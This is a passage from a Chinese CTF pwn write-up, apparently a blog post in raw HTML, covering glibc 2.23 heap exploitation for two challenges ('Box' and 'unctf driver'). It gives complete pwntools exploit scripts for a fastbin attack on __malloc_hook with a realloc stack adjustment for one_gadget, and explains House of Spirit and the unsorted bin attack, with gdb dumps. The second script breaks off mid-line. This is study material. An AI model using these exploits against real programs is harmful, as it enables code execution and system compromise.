class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">realloc = libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">malloc = libc.symbols[<span class="string">'__libc_malloc'</span>]</span><br></pre></td></tr></table></figure><p>这里常规操作，接下来的才是重头戏</p><h4 id="one-gadget失败"><a href="#one-gadget失败" class="headerlink" title="one_gadget失败"></a>one_gadget失败</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(<span class="number">0xAAAAAAAA</span>) </span><br><span class="line"><span class="comment">#payload = "a"*0xb + p64(malloc+0x1) + p64(libc.address + one_gadget[2])</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(malloc+<span class="number">0x2</span>) + p64(libc.address + one_gadget[<span class="number">1</span>])</span><br><span class="line">edit(<span class="number">3</span>, payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这里你用payload = “a”*0xb + p64(one_gadget)你会发觉成功不了，</p><p>而malloc_hook和realloc_hook通常是一起的，所以我们可以利用这个组合达到一个目的，调整栈过后在one_gadget,具体如何往下看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x45216 execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(<span class="string">"/bin/sh"</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>原因就是环境对不上，接下来讲下如何让环境对的上这个</p><ol><li><p>首先将realloc_hook覆盖成随便一个无法正常运行的地址<br>例如这种 payload = “a”*0xb + p64(0xAAAAAAAA)<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/1.png" alt="1.png"><br>成功断下</p></li><li><p>查看现在栈环境，跟上面的差别是什么</p></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x30-0x20</span><br><span class="line">0x7ffc01f8c508:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffc01f8c518:	0x00007fb957514e90	0x00007ffc01f8c680</span><br><span class="line">0x7ffc01f8c528:	0x0000562794411ca1	0x0000000000000a31</span><br><span class="line">0x7ffc01f8c538:	0x0000000000000000	0x00007ffc01f8c580</span><br><span class="line">0x7ffc01f8c548:	0x0000562794411a40	0x00007ffc01f8c680</span><br><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x30</span><br><span class="line">0x7ffc01f8c528:	0x0000562794411ca1	0x0000000000000a31</span><br><span class="line">0x7ffc01f8c538:	0x0000000000000000	0x00007ffc01f8c580</span><br><span class="line">0x7ffc01f8c548:	0x0000562794411a40	0x00007ffc01f8c680</span><br><span class="line">0x7ffc01f8c558:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffc01f8c568:	0x0000562794411d63	0x0000000094411a40</span><br><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x50</span><br><span class="line">0x7ffc01f8c548:	0x0000562794411a40	0x00007ffc01f8c680</span><br><span class="line">0x7ffc01f8c558:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffc01f8c568:	0x0000562794411d63	0x0000000094411a40</span><br><span class="line">0x7ffc01f8c578:	0x0000000000000001	0x00007ffc01f8c5a0</span><br><span class="line">0x7ffc01f8c588:	0x0000562794412001	0x0000000100000000</span><br><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x70</span><br><span class="line">0x7ffc01f8c568:	0x0000562794411d63	0x0000000094411a40</span><br><span class="line">0x7ffc01f8c578:	0x0000000000000001	0x00007ffc01f8c5a0</span><br><span class="line">0x7ffc01f8c588:	0x0000562794412001	0x0000000100000000</span><br><span class="line">0x7ffc01f8c598:	0x5c71a837f5655700	0x0000562794412050</span><br><span class="line">0x7ffc01f8c5a8:	0x00007fb9574fe830	0x0000000000000001</span><br></pre></td></tr></table></figure><p>看，上述环境没有一个符合了，那么现在该如何做呢，发觉0x10可以，0x40可以，还有0x60可以，<br>栈是往低地址生长的<br>也就是说我们只要将rsp提高0x10,就变成rsp+0x10+0x30了就可以了</p><p>调用一个函数过后通常来说栈是平衡的<br>只要我们稍微改动一下我们调用的位置就行了，比如函数头地址+4，从这里开始执行，假设绕过一个push，这样的话，就相当于pop多一个，pop多一个的话，esp会提高一个寄存器大小的位置，也就是rsp=rsp+0x8<br>利用这个特性，我们也就是说可以调整栈，让其指定位置为0</p><p>我们调整第2个one_gadget吧，让其提高0x10就可以了，怎么让其提高呢，我们可以利用malloc这个函数，因为他会调用malloc_hook，组合调用<br>我就选了malloc</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p __libc_malloc</span><br><span class="line"><span class="variable">$1</span> = &#123;void *(size_t)&#125; 0x7f4137102130 &lt;__GI___libc_malloc&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disassemble 0x7f4137102130 </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> __GI___libc_malloc:</span><br><span class="line">   0x00007f4137102130 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x00007f4137102131 &lt;+1&gt;:	push   rbx</span><br><span class="line">   0x00007f4137102132 &lt;+2&gt;:	sub    rsp,0x8</span><br><span class="line">   0x00007f4137102136 &lt;+6&gt;:	mov    rax,QWORD PTR [rip+0x33fdb3]        <span class="comment"># 0x7f4137441ef0</span></span><br><span class="line">   0x00007f413710213d &lt;+13&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00007f4137102140 &lt;+16&gt;:	<span class="built_in">test</span>   rax,rax</span><br><span class="line">   0x00007f4137102143 &lt;+19&gt;:	jne    0x7f4137102298 &lt;__GI___libc_malloc+360&gt;</span><br><span class="line">   0x00007f4137102149 &lt;+25&gt;:	mov    rax,QWORD PTR [rip+0x33fc40]        <span class="comment"># 0x7</span></span><br></pre></td></tr></table></figure><p>看函数头，我们发觉有两个push，一个sub rsp,0x8,<br>计算下我们有0x18可控，所以我们提高0x10的话，就从+2开始就行了，<br>所以<strong>payload = “a”*0xb + p64(malloc+0x2) + p64(libc.address + one_gadget[1])</strong><br>前面的a填充过后就是realloc_hook，覆盖成malloc+0x2，所以这样让栈提高0x10,接下来是malloc函数，</p><p>具体个执行过程呢就是realloc_hook被覆盖成malloc+2了，malloc_hook被覆盖成one_gadget了，<br>所以先执行的是malloc+2,然后执行malloc_hook</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  0x7f1e223d2132 &lt;malloc+2&gt;          sub    rsp, 8</span><br><span class="line">► 0x7f1e223d2136 &lt;malloc+6&gt;          mov    rax, qword ptr [rip + 0x33fdb3] &lt;0x7f1e223d2132&gt;</span><br><span class="line">  0x7f1e223d213d &lt;malloc+13&gt;         mov    rax, qword ptr [rax]</span><br><span class="line">  0x7f1e223d2140 &lt;malloc+16&gt;         <span class="built_in">test</span>   rax, rax</span><br><span class="line">  0x7f1e223d2143 &lt;malloc+19&gt;         jne    malloc+360 &lt;0x7f1e223d2298&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x7f1e223d2298 &lt;malloc+360&gt;        mov    rsi, qword ptr [rsp + 0x18]</span><br><span class="line">  0x7f1e223d229d &lt;malloc+365&gt;        add    rsp, 8</span><br><span class="line">  0x7f1e223d22a1 &lt;malloc+369&gt;        pop    rbx</span><br><span class="line">  0x7f1e223d22a2 &lt;malloc+370&gt;        pop    rbp</span><br><span class="line">  0x7f1e223d22a3 &lt;malloc+371&gt;        jmp    rax</span><br><span class="line">   ↓</span><br><span class="line">  0x7f1e2239326a &lt;do_system+1098&gt;    mov    rax, qword ptr [rip + 0x37ec47]</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes) </span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) </span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc调用前会查看mallo_hook是否存在，存在就调用malloc_hook</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">   0x00007f1e223d2130 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x00007f1e223d2131 &lt;+1&gt;:	push   rbx</span><br><span class="line">   0x00007f1e223d2132 &lt;+2&gt;:	sub    rsp,0x8</span><br><span class="line">=&gt; 0x00007f1e223d2136 &lt;+6&gt;:	mov    rax,QWORD PTR [rip+0x33fdb3]        <span class="comment"># 0x7f1e22711ef0</span></span><br><span class="line">   0x00007f1e223d213d &lt;+13&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00007f1e223d2140 &lt;+16&gt;:	<span class="built_in">test</span>   rax,rax</span><br><span class="line">   0x00007f1e223d2143 &lt;+19&gt;:	jne    0x7f1e223d2298 &lt;__GI___libc_malloc+360&gt;</span><br></pre></td></tr></table></figure><p>这里就是查看malloc_hook部分，若有调到+360处</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/2.png" alt="2.png"></p><p>看，成功迁移位置</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/3.png" alt="3.png"></p><p>这个其实可以从malloc_hook调到realloc_hook，自然也可以跳别的函数，发挥想象</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.a0yo4SjOZB/Box'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line">text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    payload = p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">    edit(<span class="number">-12</span>, payload)</span><br><span class="line">    lg(<span class="string">"text_base"</span>, text_base)</span><br><span class="line">    addr = uu64(r(<span class="number">8</span>))</span><br><span class="line">    libc.address = addr - <span class="number">0x18c7c2</span></span><br><span class="line">    <span class="keyword">if</span> (libc.address&amp;<span class="number">0xffff</span>)%<span class="number">0x1000</span>!=<span class="number">0</span>:</span><br><span class="line">	    <span class="keyword">raise</span> EOFError</span><br><span class="line">    </span><br><span class="line">    lg(<span class="string">"addr"</span>, addr)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">    new(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    realloc = libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    malloc = libc.symbols[<span class="string">'__libc_malloc'</span>]</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(<span class="number">0xAAAAAAAA</span>) </span><br><span class="line">    <span class="comment">#payload = "a"*0xb + p64(malloc+0x1) + p64(libc.address + one_gadget[2])</span></span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(malloc+<span class="number">0x2</span>) + p64(libc.address + one_gadget[<span class="number">1</span>])</span><br><span class="line">    edit(<span class="number">3</span>, payload)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(exe)</span><br></pre></td></tr></table></figure><h2 id="unctf-driver"><a href="#unctf-driver" class="headerlink" title="unctf ## driver"></a>unctf ## driver</h2><p>开头没想到怎么利用，他利用了top_chunk合并将unsortbin合并了，以前只是防止合并，利用合并也是个知识盲点</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">  consolidate into top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 如果要释放的chunk的下一个chunk是top chunk，那就合并到 top chunk</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>House Of Spirit¶<br>介绍<br>House of Spirit 是 the Malloc Maleficarum 中的一种技术。</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><p>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。<br>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK<br>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。<br>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。<br>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</p><p>又补充了知识盲区，要将chunk放入fastbin，得过掉检查，其中一个便是下一个chunk的size检查，不能小于两倍的size_s，并且不能大于sysstem_mem</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">      and used quickly in malloc.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast())</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If TRIM_FASTBINS set, don't place chunks</span></span><br><span class="line"><span class="comment">      bordering top into fastbins</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="comment">//默认 #define TRIM_FASTBINS 0，因此默认情况下下面的语句不会执行</span></span><br><span class="line">       <span class="comment">// 如果当前chunk是fast chunk，并且下一个chunk是top chunk，则不能插入</span></span><br><span class="line">        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">            ) &#123;</span><br><span class="line">        <span class="comment">// 下一个chunk的大小不能小于两倍的SIZE_SZ,并且</span></span><br><span class="line">        <span class="comment">// 下一个chunk的大小不能大于system_mem， 一般为132k</span></span><br><span class="line">        <span class="comment">// 如果出现这样的情况，就报错。</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(</span><br><span class="line">                chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">            __builtin_expect(</span><br><span class="line">                chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">/* We might not have a lock at this point and concurrent</span></span><br><span class="line"><span class="comment">               modifications</span></span><br><span class="line"><span class="comment">               of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">               after getting the lock.  */</span></span><br><span class="line">            <span class="keyword">if</span> (have_lock || (&#123;</span><br><span class="line">                    assert(locked == <span class="number">0</span>);</span><br><span class="line">                    __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">                    locked = <span class="number">1</span>;</span><br><span class="line">                    chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ ||</span><br><span class="line">                        chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">                &#125;)) &#123;</span><br><span class="line">                errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">                __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">                locked = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将chunk的mem部分全部设置为perturb_byte</span></span><br><span class="line">        free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">        <span class="comment">// 设置fast chunk的标记位</span></span><br><span class="line">        set_fastchunks(av);</span><br><span class="line">        <span class="comment">// 根据大小获取fast bin的索引</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">        <span class="comment">// 获取对应fastbin的头指针，被初始化后为NULL。</span></span><br><span class="line">        fb               = &amp;fastbin(av, idx);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">        <span class="comment">// 使用原子操作将P插入到链表中</span></span><br><span class="line">        mchunkptr    old     = *fb, old2;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">               add</span></span><br><span class="line"><span class="comment">               (i.e., double free).  */</span></span><br><span class="line">            <span class="comment">// so we can not double free one fastbin chunk</span></span><br><span class="line">            <span class="comment">// 防止对 fast bin double free</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">                errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">               size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">               only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">               deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">            <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">                old_idx = fastbin_index(chunksize(old));</span><br><span class="line">            p-&gt;fd = old2 = old;</span><br><span class="line">        &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) !=</span><br><span class="line">                 old2);</span><br><span class="line">        <span class="comment">// 确保fast bin的加入前与加入后相同</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">            errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>还用到了unsortbin攻击，强，各种组合，多次house of sprit加unsortbin攻击</p><p>整体流程，unlink造成可以house of sprit攻击，然后通过多次house of sprit攻击，后门用unsortedbin攻击，最后getshell,流程复杂，原理简单</p><p>我本来想用chunk extends加fastbin attack，发觉他给了这么多功能好像没用上，应该不是这个攻击方法。。。然后就去看wp了，发觉他的wp攻击流程那些点全用上了，不过复杂起来了，赛后还看到另外师傅的wp，就是说这个有非预期，就是用chunk extends加fastbin attack</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.ReKO1V3cZk/pwn'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span 